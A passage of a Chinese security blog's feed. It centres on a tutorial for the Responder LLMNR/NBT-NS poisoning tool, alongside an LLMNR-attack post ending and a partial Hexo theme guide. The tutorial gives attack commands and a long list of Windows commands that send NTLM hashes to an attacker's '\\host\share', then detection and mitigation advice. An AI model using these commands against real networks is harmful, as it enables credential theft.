src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161120-b761d7e8-d413-1.png" alt="攻击者机器"></p><p>在 XP 中预先安装某记录登录密码的程序，记录任何成功或失败的登录信息，可以看到管理员输入的登录信息：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161127-bbbb955e-d413-1.png" alt="Windows XP"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>关于 LLMNR Poison 攻击的实战思路还有很多，包括劫持 FTP，MySQL，MSSQL Server 等等，具体的实现可以自由发挥。</p><p>为了防止遭到 LLMNR Poison 攻击，可以导入下面的注册表键值关闭 LLMNR：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient&quot; /v EnableMulticast /t REG_DWORD /d 0 /f<br>reg add &quot;HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows NT\DNSClient&quot; /v EnableMulticast /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><p>不过，关闭了 LLMNR 以后， 可能用户的一些正常需求会受到影响。</p><p><strong>参考文章：</strong><a href="https://xz.aliyun.com/t/1679/">https://xz.aliyun.com/t/1679/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>名称解析</tag>
      
      <tag>LLMNR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Responder 内网渗透神器</title>
    <link href="/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    <url>/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Responder 是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。</p><p>工作原理是，在域名解析过程中，如果客户端/目标无法通过 DNS 进行域名解析，则会回退到 LLMNR 和 NBT-NS 协议下进行解析，在 Responder 运行的情况下，会对所有能收到的 LLMNR 和 NBT-NS 请求进行欺骗性响应，然后将所有的数据流导向到攻击者的机器。</p><p><strong>下载地址：</strong></p><ol><li><a href="https://github.com/SpiderLabs/Responder">LLMNR/NBT-NS/mDNS Poisoner</a></li><li><a href="https://github.com/lgandx/Responder">LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay</a></li></ol><h2 id="0x01-功能特性"><a href="#0x01-功能特性" class="headerlink" title="0x01 功能特性"></a>0x01 功能特性</h2><ul><li><p>内置 SMB 认证服务器</p><p>默认支持带 NTLMSSP 安全扩展的 NTLMv1, NTLMv2 散列，已在 Windows 95 到 Windows Server 2012 RC, Samba 和 Mac OSX Lion 上成功测试。Windows NT4 支持明文密码，对于 Windows XP/2003 以及更早的版本，当设置 <code>--lm</code> 选项时，启用强制 LM 哈希降级。当工具启动时默认开启此功能，可以截获 Hash 进行 SMB 重放攻击（SMB Relay）。</p></li><li><p>内置 MSSQL 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 MSSQL 身份验证重定向到此工具（对于 Vista 和更高版本，Windows 将使用 LLMNR 协议）。该服务器支持 NTLMv1、LMv2 散列，已在 Windows SQL Server 2005 和 2008 上成功测试。</p></li><li><p>内置 HTTP 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTP 身份验证重定向到此工具。该服务器支持 NTLMv1、NTLMv2 散列和基本身份验证，已在 IE 6 到 IE 10, Firefox, Chrome, Safari 上成功测试。</p><blockquote><p>注：此模块也适用于拦截 Windows WebDav 客户端（WebClient）发出的 WebDav NTLM 认证，可以向受害者发送任意文件。</p></blockquote></li><li><p>内置 HTTPS 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTPS 身份验证重定向到此工具。</p><blockquote><p><code>certs/</code> 目录下有两个默认的证书文件，目的是使 Responder 可以更容易使用，你也可以根据需要使用脚本生成自签名密钥对。</p></blockquote></li><li><p>内置 LDAP 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 LDAP 身份验证重定向到此工具。该服务器已在 Windows支持工具 ldp 和 LdapAdmin 上成功测试。</p></li><li><p>内置 FTP, POP3, IMAP, SMTP 认证服务器</p><p>用于收集明文凭证。</p></li><li><p>内置 DNS 服务器</p><p>用于响应 A 类型的查询请求，结合 ARP 欺骗攻击将非常强大。</p></li><li><p>内置 WPAD 代理服务器</p><p><strong>这个模块非常有效</strong>，此模块将捕获网络中其他用户所有的 HTTP 请求。您可以在 <code>Responder.conf</code> 中配置自定义的 PAC 脚本文件，并将 HTML 代码注入服务器的响应中，具体细节可以看 <code>Responder.conf</code>。</p><p>该模块会抓取网络中的数据包,然后找到开启了Auto-detect settings的ie浏览器,然后向他注入PAC脚本具体可以看Responder.conf.</p><blockquote><p>注：需要用户在 IE 中启用了“自动检测设置”（Auto-detect settings）。</p></blockquote></li><li><p>Browser Listener</p><p>浏览器监听模块，该模块允许在隐身模式下找到 PDC。</p><blockquote><p>PDC：Primary Domain Controller（Microsoft Windows NT Server），主域控制器</p></blockquote></li><li><p>Fingerprinting</p><p>指纹识别模式，当使用 <code>-f</code> 选项时，Responder 会自动识别使用 LLMNR/NBT-NS 查询的主机指纹，所有捕获模块在指纹识别模式下仍然可以工作。</p></li><li><p>Icmp Redirect</p><p>ICMP 重定向攻击（ICMP Redirects）模块，适用于 Windows XP/2003 和更早版本的域成员间进行 MITM 中间人攻击，结合 DNS 服务器模块使用会相当有效。</p><blockquote><p>使用 python tools/Icmp-Redirect.py</p></blockquote></li><li><p>Rogue DHCP</p><p>DHCP 欺骗攻击（DHCP Inform Spoofing）模块，允许你让真正的 DHCP 服务器响应 DHCPINFORM 请求，从而设置你的 IP 地址为主 DNS 服务器，并设置你自己的 WPAD 代理服务器。</p><blockquote><p>使用 python tools/DHCP.py</p></blockquote></li><li><p>Analyze mode</p><p>分析模式，在模式下允许你查看网络上的 NBT-NS、BROWSER、LLMNR、DNS 请求，而不会进行任何攻击行为。此外，您还可以被动地映射域、MSSQL 服务器和工作站的网络拓扑，并查看 ICMP 重定向攻击在子网上是否可行。</p></li></ul><h2 id="0x02-选项参数"><a href="#0x02-选项参数" class="headerlink" title="0x02 选项参数"></a>0x02 选项参数</h2><blockquote><p>在使用前请查看 <code>Response .conf</code> 并根据您的需要进行调整。</p></blockquote><p>使用样例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Responder</span>.</span></span>py -I eth0 -wrf<br></code></pre></td></tr></table></figure><p>选项：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-comment">--version             show program&#x27;s version number and exit</span><br>-h, <span class="hljs-comment">--help            show this help message and exit</span><br>-A, <span class="hljs-comment">--analyze         Analyze mode. This option allows you to see NBT-NS,</span><br>                      BROWSER, LLMNR requests without responding.<br>-I eth0, <span class="hljs-comment">--interface=eth0</span><br>                      Network interface <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span>, you can <span class="hljs-keyword">use</span> <span class="hljs-symbol">&#x27;ALL</span>&#x27; as a<br>                      wildcard <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> interfaces<br>-i <span class="hljs-number">10.0</span>.<span class="hljs-number">0.21</span>, <span class="hljs-comment">--ip=10.0.0.21</span><br>                      Local IP <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> (only <span class="hljs-keyword">for</span> OSX)<br>-e <span class="hljs-number">10.0</span>.<span class="hljs-number">0.22</span>, <span class="hljs-comment">--externalip=10.0.0.22</span><br>                      Poison <span class="hljs-keyword">all</span> requests <span class="hljs-keyword">with</span> another IP address than<br>                      Responder<span class="hljs-symbol">&#x27;s</span> one.<br>-b, <span class="hljs-comment">--basic           Return a Basic HTTP authentication. Default: NTLM</span><br>-r, <span class="hljs-comment">--wredir          Enable answers for netbios wredir suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> wredir will likely break stuff <span class="hljs-keyword">on</span> the<br>                      network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-d, <span class="hljs-comment">--NBTNSdomain     Enable answers for netbios domain suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> domain suffixes will likely break stuff<br>                      <span class="hljs-keyword">on</span> the network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-f, <span class="hljs-comment">--fingerprint     This option allows you to fingerprint a host that</span><br>                      issued an NBT-NS <span class="hljs-keyword">or</span> LLMNR query.<br>-w, <span class="hljs-comment">--wpad            Start the WPAD rogue proxy server. Default value is</span><br>                      <span class="hljs-literal">False</span><br>-u UPSTREAM_PROXY, <span class="hljs-comment">--upstream-proxy=UPSTREAM_PROXY</span><br>                      Upstream HTTP proxy used by the rogue WPAD Proxy <span class="hljs-keyword">for</span><br>                      outgoing requests (format: host:<span class="hljs-keyword">port</span>)<br>-F, <span class="hljs-comment">--ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file</span><br>                      retrieval. This may cause a login prompt. <span class="hljs-keyword">Default</span>:<br>                      <span class="hljs-literal">False</span><br>-P, <span class="hljs-comment">--ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br>                      authentication <span class="hljs-keyword">for</span> the proxy. WPAD doesn<span class="hljs-symbol">&#x27;t</span> need <span class="hljs-keyword">to</span> be<br>                      <span class="hljs-keyword">ON</span>. This option <span class="hljs-keyword">is</span> highly effective <span class="hljs-keyword">when</span> combined <span class="hljs-keyword">with</span><br>                      -r. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br><span class="hljs-comment">--lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br>                      earlier. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-v, <span class="hljs-comment">--verbose         Increase verbosity.</span><br></code></pre></td></tr></table></figure><h2 id="0x03-使用示例"><a href="#0x03-使用示例" class="headerlink" title="0x03 使用示例"></a>0x03 使用示例</h2><ul><li><p><strong>针对特定主机</strong></p><p>如果你想针对特定的 IP / IP范围，可以通过修改 <code>Responder.conf</code> 并更改 <strong>RespondTo</strong> 参数。当你只是想针对特定的目标时，这是非常有用的，因为你不希望导致整个网络的中断。此外，还可以通过改变 RespondToName 参数来指定 NBT-NS/LLMNR 名称。下图中，我们就是针对主机 192.168.253.130 进行的特定攻击。</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562575008600.png" alt="修改 Responder.conf 文件更改 RespondTo 参数"></p></li><li><p><strong>分析模式</strong></p><blockquote><p>使用 ./Responder.py -I eth0 -A 命令启用分析模式</p></blockquote><p>在 <code>-A</code> 分析模式下时，Responder 会被动监听网络中的事件，但不主动响应任何请求，如图所示：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562576050781.png" alt="启动 Responder 分析模式 "></p></li><li><p><strong>WPAD 攻击</strong></p><blockquote><p>使用 ./Responder.py -I eth0 wrf 命令启动 WPAD 攻击</p></blockquote><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562659253546.png" alt="启动 Responder WPAD 攻击模式 "></p><p>对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 Hash 尝试登录，因此可以模拟 SMB 服务器从而截获 Hash，执行如下命令都可以在攻击机得到 Hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">net.exe use \\host\share<br>attrib.exe \\host\share<br>bcdboot.exe \\host\share<br>bdeunlock.exe \\host\share<br>cacls.exe \\host\share<br>certreq.exe \\host\share #(noisy, pops an error dialog)<br>certutil.exe \\host\share<br>cipher.exe \\host\share<br>ClipUp.exe -l \\host\share<br>cmdl32.exe \\host\share<br>cmstp.exe /s \\host\share<br>colorcpl.exe \\host\share #(noisy, pops an error dialog)<br>comp.exe /N=0 \\host\share \\host\share<br>compact.exe \\host\share<br>control.exe \\host\share<br>convertvhd.exe -source \\host\share -destination \\host\share<br>Defrag.exe \\host\share<br>DeployUtil.exe /install \\host\share<br>DevToolsLauncher.exe GetFileListing \\host\share #(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)<br>diskperf.exe \\host\share<br>dispdiag.exe -out \\host\share<br>doskey.exe /MACROFILE=\\host\share<br>esentutl.exe /k \\host\share<br>expand.exe \\host\share<br>extrac32.exe \\host\share<br>FileHistory.exe \\host\share #(noisy, pops a gui)<br>findstr.exe * \\host\share<br>fontview.exe \\host\share #(noisy, pops an error dialog)<br>fvenotify.exe \\host\share #(noisy, pops an access denied error)<br>FXSCOVER.exe \\host\share #(noisy, pops GUI)<br>hwrcomp.exe -check \\host\share<br>hwrreg.exe \\host\share<br>icacls.exe \\host\share<br>LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)<br>licensingdiag.exe -cab \\host\share<br>lodctr.exe \\host\share<br>lpksetup.exe /p \\host\share /s<br>makecab.exe \\host\share<br>MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)<br>mshta.exe \\host\share #(noisy, pops an HTA window)<br>msiexec.exe /update \\host\share /quiet<br>msinfo32.exe \\host\share #(noisy, pops a &quot;cannot open&quot; dialog)<br>mspaint.exe \\host\share #(noisy, invalid path to png error)<br>mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)<br>msra.exe /openfile \\host\share #(noisy, error)<br>mstsc.exe \\host\share #(noisy, error)<br>netcfg.exe -l \\host\share -c p -i foo<br></code></pre></td></tr></table></figure><p><strong>攻击流量情况：</strong></p></li></ul><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-02-02.png" alt="向受害者发送 NBNS 欺骗响应"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-12-06.png" alt="向受害者发送 LLMNR 欺骗响应"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-10-38.png" alt="重定向身份认证过程中 SMB 传输的用户名和 HASH 值 "></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><h3 id="特征流量检测"><a href="#特征流量检测" class="headerlink" title="特征流量检测"></a>特征流量检测</h3><ul><li><p>特征行为检测</p><p>程序在启动时会连续发送两个完全相同的 IGMPv3 数据包，请求同时加入 224.0.0.251 和 224.0.0.252 组播组，同样程序在退出时，也会发送两个相同的 IGMPv3 数据包，请求离开上述的组播组，如下图所示：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-34.png" alt="Responder 工具 WPAD 攻击启动时行为"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-49.png" alt="Responder 工具 WPAD 攻击退出时行为 "></p></li><li><p>特殊协议捕获</p><p>对整个过程中使用的特殊协议进行捕获（主要为 SMB、LLMNR、NBNS、MDNS、IGMPv3、BROWSER），如果多个上述协议中的数据流量同时指向一个主机，则怀疑有可能受到攻击。</p></li><li><p>特征端口检测</p><p>该工具监听以下端口：UDP 137, UDP 138, UDP 53, UDP/TCP 389, TCP 1433, TCP 80, TCP 139, TCP 445, TCP 21, TCP 3141, TCP 25, TCP 110, TCP 587 和 多播 UDP 5553。</p><p>对这些特殊端口的流量要格外注意，并加强分析。</p></li><li><p>敏感内容检测</p><p>重点关注 SMB 数据包中所返回的明文内容，其包含用户在 NTML 验证过程中所使用的 Username、hash 值等，对敏感字符做特征匹配。</p></li></ul><h3 id="预防和修复"><a href="#预防和修复" class="headerlink" title="预防和修复"></a>预防和修复</h3><p>为了加强 Windows 系统的安全性，可以进行以下调整。</p><ul><li><p>通过组策略禁用 LLMNR</p><p>打开 gpedit.msc 到计算机配置 &gt; 管理 &gt; 网络 &gt; DNS 客户端 &gt; 关闭多播域名解析，并设置为已启用：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661260.png" alt="关闭多播域名解析"></p></li><li><p>禁用 NetBIOS</p><p>这可以到以太网 &gt; 属性 &gt; IPv4 &gt; 属性 &gt; 高级 &gt; WINS，然后在“NetBIOS设置”下选择禁用 TCP/IP 上的 NetBIOS：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661261.png" alt="禁用 TCP/IP 上的 NetBIOS "></p><blockquote><p>或者通过到注册表修改下面的键，并将值更改为2 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces{$ InterfaceID}\NetbiosOptions</p></blockquote></li><li><p>通过组策略启用 SMB 签名</p><p>SMB签名的更多细节以及可以定义的各种值可以在以下链接中找到：<br><a href="http://techgenix.com/secure-smb-connections/">http://techgenix.com/secure-smb-connections/</a><br><a href="https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx">https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx</a></p></li></ul><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul><li><a href="https://github.com/SpiderLabs/Responder/blob/master/README.md">SpiderLabs/Responder - README.md</a></li><li><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/responder-20-owning-windows-networks-part-3/">Responder 2.0 - Owning Windows Networks part 3</a></li><li><a href="https://www.secpulse.com/archives/65503.html">渗透师指南之Responder</a></li><li><a href="https://www.jianshu.com/p/1b545a8b8b1e">内网渗透之Responder与Net-NTML hash</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>Responder</tag>
      
      <tag>WPAD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo yilia 主题优化方案</title>
    <link href="/post/Hexo%20yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/"/>
    <url>/post/Hexo%20yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>Hexo 虽然好用，但配置主题时遇到的坑确实是挺多的，网上大部分的回答都是复制粘贴、良莠不齐，所以把自己优化 yilia 主题的过程整理了一下，希望后来的人可以少走弯路。</p><h2 id="Hexo-主题优化"><a href="#Hexo-主题优化" class="headerlink" title="Hexo 主题优化"></a>Hexo 主题优化</h2><h3 id="修改-Hexo-配置文件"><a href="#修改-Hexo-配置文件" class="headerlink" title="修改 Hexo 配置文件"></a>修改 Hexo 配置文件</h3><p>配置根目录下的 <code>_config.yml</code> ：</p><figure class="highlight yaml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Site</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">eW1z4rd</span> <span class="hljs-string">树屋</span>  <span class="hljs-comment"># 网页标题</span><br><span class="hljs-attr">subtitle:</span> <span class="hljs-string">左手程式，右手诗</span>  <span class="hljs-comment"># 侧边菜单栏描述</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">eW1z4rd</span>  <span class="hljs-comment"># 作者名</span><br><br><span class="hljs-comment"># URL</span><br><span class="hljs-attr">url:</span> <span class="hljs-string">https://eW1z4rd.github.io</span>  <span class="hljs-comment"># 网站链接</span><br><span class="hljs-attr">root:</span> <span class="hljs-string">/</span>  <span class="hljs-comment"># 网站根目录</span><br><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year/:month/:day/:title/</span>  <span class="hljs-comment"># 文章路径格式</span><br><br><span class="hljs-comment"># Writing</span><br><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 生成资源文件夹</span><br><span class="hljs-attr">highlight:</span>  <span class="hljs-comment"># 代码高亮</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">auto_detect:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># Extensions</span><br><span class="hljs-attr">theme:</span> <span class="hljs-string">yilia</span>  <span class="hljs-comment"># 使用的主题</span><br><br><span class="hljs-comment"># Deployment</span><br><span class="hljs-attr">deploy:</span>  <span class="hljs-comment"># 部署到 Github Page</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">git@github.com:eW1z4rd/eW1z4rd.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><h3 id="修改-yilia-配置文件"><a href="#修改-yilia-配置文件" class="headerlink" title="修改 yilia 配置文件"></a>修改 yilia 配置文件</h3><p>配置 yilia 文件夹下的 <code>_config.yml</code>（<code>hexo/themes/yilia/_config.yml</code>）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Header</span><br><span class="hljs-attr">menu:</span>  <span class="hljs-comment"># 主页左侧菜单</span><br>  <span class="hljs-string">主页:</span> <span class="hljs-string">/</span><br>  <span class="hljs-string">归档:</span> <span class="hljs-string">/archives</span><br><br><span class="hljs-comment"># SubNav</span><br><span class="hljs-attr">subnav:</span>  <span class="hljs-comment"># 子导航</span><br>  <span class="hljs-attr">github:</span> <span class="hljs-string">&quot;https://github.com/eW1z4rd/&quot;</span><br>  <span class="hljs-attr">mail:</span> <span class="hljs-string">&quot;mailto:chill_wizard@foxmail.com&quot;</span><br><br><span class="hljs-comment"># Content</span><br><span class="hljs-attr">excerpt_link:</span> <span class="hljs-string">阅读全文</span>  <span class="hljs-comment"># 文章截断按钮文字</span><br><span class="hljs-attr">show_all_link:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 文章卡片右下角常驻链接</span><br><br><span class="hljs-comment"># 目录</span><br><span class="hljs-attr">toc:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># 目录常显</span><br><span class="hljs-attr">toc_empty_wording:</span> <span class="hljs-string">&#x27;暂无目录…&#x27;</span>  <span class="hljs-comment"># 目录为空时的提示</span><br><br><span class="hljs-comment"># 是否有快速回到顶部的按钮</span><br><span class="hljs-attr">top:</span> <span class="hljs-literal">true</span>  <br><br><span class="hljs-comment"># Miscellaneous</span><br><span class="hljs-attr">baidu_analytics:</span> <span class="hljs-string">&#x27;f307e**********9239b6cfc3&#x27;</span>  <span class="hljs-comment"># 百度统计 API</span><br><span class="hljs-attr">favicon:</span> <span class="hljs-string">/img/favicon.ico</span>  <span class="hljs-comment"># ico 图标</span><br><br><span class="hljs-comment"># 作者头像</span><br><span class="hljs-attr">avatar:</span> <span class="hljs-string">/img/portrait.jpg</span>  <br><br><span class="hljs-comment"># 样式定制</span><br><span class="hljs-attr">style:</span><br>  <span class="hljs-attr">header:</span> <span class="hljs-string">&#x27;#4d4d4d&#x27;</span>  <span class="hljs-comment"># 头像上面的背景颜色</span><br>  <span class="hljs-attr">slider:</span> <span class="hljs-string">&#x27;linear-gradient(200deg,#ccc,#000)&#x27;</span>  <span class="hljs-comment"># 右滑板块背景</span><br><br><span class="hljs-comment"># 智能菜单</span><br><span class="hljs-attr">smart_menu:</span><br>  <span class="hljs-attr">innerArchive:</span> <span class="hljs-string">&#x27;所有文章&#x27;</span><br>  <span class="hljs-attr">friends:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">aboutme:</span> <span class="hljs-string">&#x27;关于我&#x27;</span><br><br><span class="hljs-comment"># 个人描述</span><br><span class="hljs-attr">aboutme:</span><br>  <span class="hljs-string">&lt;br&gt;</span><br>  <span class="hljs-string">evil</span> <span class="hljs-string">or</span> <span class="hljs-string">weakness</span><br>  <span class="hljs-string">&lt;br&gt;</span><br></code></pre></td></tr></table></figure><h3 id="配置缺失模块"><a href="#配置缺失模块" class="headerlink" title="配置缺失模块"></a>配置缺失模块</h3><ul><li>确保 node 版本大于 6.2</li><li>在根目录执行：<code>npm install hexo-generator-json-content --save</code></li><li>在根目录下的 <code>_config.yml</code>插入以下内容：</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code 